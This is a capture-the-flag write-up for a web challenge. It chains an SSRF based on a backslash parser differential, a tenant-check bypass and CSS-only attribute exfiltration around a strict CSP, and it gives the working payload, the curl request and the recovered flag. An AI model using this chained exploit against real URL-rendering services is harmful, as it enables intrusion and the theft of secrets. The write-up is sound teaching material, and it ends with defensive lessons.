# Chromium's Mirage

| | |
|---|---|
| **CTF** | BCS CTF 2026 |
| **Category** | Web |
| **Difficulty** | Hard |
| **Points** | 240 (13 solves) |
| **Author** | M Ariful Islam |
| **Files** | `gateway/` (FastAPI + Playwright/Chromium), `vault/` (FastAPI), `docker-compose.yml` |
| **Flag** | `bcsctf{wh4twg_par53r_m1r4ge}` |

## Challenge

> SecureCorp has launched a state-of-the-art PDF Export Gateway to allow employees to
> archive internal dashboards and compliance certificates.
> To ensure strict zero-trust isolation, the service implements server-side URL validation
> against an explicit corporate allowlist, blocks all outgoing external traffic, and
> subjects internal endpoints to a zero-script Content Security Policy.
> Your intelligence suggests an internal vault service holds the master API token for
> tenant `report-portal.local`.
> Can you pierce through the gateway's parser boundaries, silence the CSP, and extract the
> secret from the generated report?
>
> Target: `http://172.16.38.22:14500`

## TL;DR

Two internal services, three independent defenses, three independent bypasses:

1. **SSRF via parser differential** - the gateway validates the target URL with Python's
   `urllib.parse.urlsplit`, then hands the *same raw string* to headless Chromium
   (`page.goto`). A backslash in the URL is parsed differently by the two: Python reads it
   as literal text (hostname still matches the allowlist), while Chromium's WHATWG URL
   parser rewrites `\` to `/` and navigates somewhere else entirely - the internal `vault`
   service.
2. **Tenant re-normalization** - the rewrite leaves a stray `@` on the path; the vault's own
   `tenant.lstrip("@")` happily strips it back to a valid tenant ID.
3. **CSS-only exfiltration** - the flag sits in an HTML `data-*` attribute (never rendered
   as text) behind `script-src 'none'`. A reflected `theme` query parameter injects
   attacker CSS into the page's `<style>` block, and `content: attr(data-token)` paints the
   attribute's value onto the page as visible text - no JavaScript required, so the CSP
   never fires. The PDF the gateway hands back is the exfil channel.

## Recon

`docker-compose.yml` shows two services on one internal Docker network - only `gateway`
is exposed:

```yaml
services:
  gateway:
    build: ./gateway
    ports: ["14500:14500"]
    networks: [ctf-internal]
    depends_on: [vault]
  vault:
    build: ./vault
    environment: [FLAG=bcsctf{...}]
    networks: [ctf-internal]
```

**`gateway/main.py`** - `POST /render {"url": ...}`:

```python
ALLOWED_HOSTS = ["report-portal.local", "analytics.local"]

def is_authorized_endpoint(target_url: str) -> bool:
    parsed = urllib.parse.urlsplit(target_url)
    if parsed.scheme not in ("http", "https"):
        return False
    if parsed.hostname not in ALLOWED_HOSTS:
        return False
    return True

@app.post("/render")
async def render_pdf(req: RenderRequest):
    if not is_authorized_endpoint(req.url):
        raise HTTPException(403, ...)
    ...
    page = await browser.new_page()
    response = await page.goto(req.url, wait_until="load", timeout=8000)
    ...
    pdf_bytes = await page.pdf(print_background=True)
    return Response(content=pdf_bytes, media_type="application/pdf")
```

The validator and the actual navigation both consume `req.url` **verbatim** - a classic
setup for a parser-differential SSRF if the two parsers ever disagree.

**`vault/app.py`** - `GET /{tenant}/admin/view?theme=`:

```python
PAGE_HTML = """...
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'none'; style-src 'unsafe-inline';">
...
<style> ... __CUSTOM_THEME__ </style>
...
<div id="vault" data-token="__FLAG__">
    <p>Security Level: Level 4 Classified</p>
</div>
..."""

@app.get("/{tenant}/admin/view", response_class=HTMLResponse)
def get_secret(tenant: str, theme: str = Query(default="")):
    normalized_tenant = tenant.lstrip("@")
    if normalized_tenant != "report-portal.local":
        return HTMLResponse("403 Forbidden", status_code=403)
    content = (PAGE_HTML.replace("__TENANT__", tenant)
                         .replace("__FLAG__", FLAG)
                         .replace("__CUSTOM_THEME__", theme))
    return HTMLResponse(content)
```

Three things jump out immediately:

- The flag is placed in a `data-token` **attribute**, not text content - it will never
  show up in a naive "read the rendered text" approach, and it survives a zero-script CSP
  untouched since attributes aren't affected by `script-src`.
- `theme` is concatenated **raw** into a `<style>` block - free CSS injection.
- `tenant.lstrip("@")` is a strange, specific normalization to ship in production code.
  Code that strips a very particular character before a comparison is usually there
  because the intended exploit path produces exactly that character. It's a hint, not
  an accident.

## Step 1: the parser differential (SSRF)

The gateway's allowlist check and its actual browser navigation use two different URL
parsers that disagree on **backslash handling**:

```python
>>> import urllib.parse
>>> urllib.parse.urlsplit("http://vault:15000\\@report-portal.local/admin/view").hostname
'report-portal.local'
```

Python's `urlsplit` treats `vault:15000\` as literal `userinfo` up to the `@`, so
`hostname` comes back as `report-portal.local` - passes the allowlist cleanly.

Chromium's URL parser (WHATWG spec) normalizes backslashes to forward slashes in special
schemes (`http`/`https`) **before** parsing authority/path. The same string, inside
`page.goto`, becomes:

```
http://vault:15000/@report-portal.local/admin/view
```

i.e. Chromium connects to **`vault:15000`** (the real internal hostname from
`docker-compose.yml`), with path `/@report-portal.local/admin/view`. The allowlist check
and the actual request target completely diverge - textbook parser-boundary SSRF.

## Step 2: satisfying `tenant.lstrip("@")`

The rewritten path's first segment is `@report-portal.local`, so the vault receives
`tenant = "@report-portal.local"`. Its own `lstrip("@")` normalizes that straight back to
`report-portal.local`, which passes `get_secret`'s tenant check. The `@` that Chromium's
parser leaves behind is exactly what that line of code exists to eat - confirming the
intended path.

## Step 3: silencing the CSP without a script

The vault's CSP is `default-src 'self'; script-src 'none'; style-src 'unsafe-inline'`.
No JS execution is possible, and the flag is never in the DOM as visible text - only as
`data-token="<flag>"` on `#vault`. But `style-src 'unsafe-inline'` is still wide open, and
`theme` is reflected unescaped into `<style>`. CSS alone can read an attribute and render
it as text via generated content:

```css
#vault::before{
  content: attr(data-token);
  display: block;
  font-size: 40px;
  color: #000;
}
```

No script tag, no event handler, no `javascript:` URL - so `script-src 'none'` is simply
irrelevant to this technique. And since "block outgoing external traffic" only stops
*this* container reaching the outside world, it doesn't matter: the flag doesn't need to
leave the network at all - it just needs to end up **visible in the PDF that the gateway
already hands back to the attacker** over the front-door API.

## Exploit

Combine all three into one `url` sent to the public gateway:

```python
import urllib.parse, json

css   = "#vault::before{content:attr(data-token);display:block;font-size:40px;color:#000}"
theme = urllib.parse.quote(css, safe="")
url   = "http://vault:15000\\@report-portal.local/admin/view?theme=" + theme

print(json.dumps({"url": url}))
```

```
{"url": "http://vault:15000\\@report-portal.local/admin/view?theme=%23vault%3A%3Abefore%7Bcontent%3Aattr%28data-token%29%3Bdisplay%3Ablock%3Bfont-size%3A40px%3Bcolor%3A%23000%7D"}
```

Send it to `/render`:

```bash
curl -s -X POST http://172.16.38.22:14500/render \
  -H "Content-Type: application/json" \
  -d '{"url": "http://vault:15000\\@report-portal.local/admin/view?theme=%23vault%3A%3Abefore%7Bcontent%3Aattr%28data-token%29%3Bdisplay%3Ablock%3Bfont-size%3A40px%3Bcolor%3A%23000%7D"}' \
  --output flag.pdf
```

The gateway returns `200 OK` with a PDF. Extracting its text (the flag is now rendered
as real page content, not just an attribute):

```bash
$ pdftotext flag.pdf -
Enterprise Access Card
Tenant: @report-portal.local
bcsctf{wh4twg_par53r_m1r4ge}
Security Level: Level 4 Classified
```

[`solve.py`](solve.py) automates payload construction and the request.

## Pitfalls

- **Naive text extraction of the PDF misses attribute-only secrets.** The flag never
  appears as text unless something (here, our injected CSS) actively pulls it out of the
  `data-token` attribute first. Grepping the raw PDF bytes for `bcsctf{` also fails
  outright - PDF content streams are FlateDecode-compressed, so the string isn't present
  as a contiguous byte sequence anywhere in the file; only a proper PDF text extractor
  (`pdftotext`) or a stream-by-stream `zlib.decompress` recovers it.
- **VPN path-MTU black hole looked identical to the target being down.** Mid-solve, the
  assigned instance briefly stopped answering HTTP entirely (TCP handshake completed, but
  zero bytes ever came back, even for a trivial 404) while ICMP still round-tripped fine
  at any packet size. That combination - large ICMP fine both directions, but literally
  every HTTP response silently dropped regardless of client-side MTU (tested down to 576)
  - ruled out MTU/fragmentation and correctly pointed at a genuinely hung instance on the
  challenge side, not a local network issue. Lesson: don't tune client MTU chasing a
  timeout until you've shown large payloads actually fail to round-trip; if ICMP is fine
  at full size but TCP data never returns *at any* MTU, stop blaming the tunnel.
- **The `@` in the payload is load-bearing, not incidental.** It's easy to "clean up" the
  URL by removing what looks like a stray character before the hostname - but that `@` is
  exactly what `tenant.lstrip("@")` is written to consume, and removing it breaks the
  tenant check on the vault side.

## Takeaways

- Never validate a URL with one parser and *use* it with another. Any two
  RFC-3986-vs-WHATWG-divergent implementations (Python `urllib`, Chromium/Node's `URL`,
  Go's `net/url`, etc.) can be made to disagree on backslashes, whitespace, unusual
  schemes, or userinfo - and SSRF allowlists built on the "wrong" parser are bypassable by
  construction, not by luck.
- A restrictive CSP only closes the channels it names. `script-src 'none'` stops nothing
  if the secret can be read and exfiltrated through **CSS alone** - `attr()` in
  `content`, or even pure `::before`/`::after` timing/selector tricks, can leak data with
  zero script execution whenever `style-src` still allows inline styles and user input
  reaches a `<style>` block.
- "No outbound network access" doesn't stop exfiltration when the *response itself* is the
  exfil channel - here, the secret rode home inside the very PDF the API was designed to
  return to the caller.
